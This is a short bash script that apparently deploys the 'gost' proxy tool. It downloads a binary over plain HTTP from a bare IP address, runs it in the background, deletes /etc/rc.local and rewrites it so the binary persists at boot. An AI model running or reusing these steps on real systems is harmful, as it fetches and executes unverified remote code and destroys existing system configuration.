#!/bin/bash
pid=`ps -ef | grep "gost" | grep -v "grep" | grep -v "gost.sh"  | awk '{print $2}'`
if [ -n "$pid" ]
then
	echo "kill running gost $pid"
	kill -9 $pid
fi
args=$*
rm -rf /gost
wget http://143.92.34.130/gost -O /gost 
chmod +x /gost 
nohup /gost  $args 2>&1 > /gost.log &
rm -rf /etc/rc.local
cat >> /etc/rc.local << EOF
#!/bin/bash
##!/bin/sh -e
nohup /gost $args 2>&1 > /gost.log &
exit 0
EOF
chmod +x /etc/rc.local
cat /gost.log
exit 0
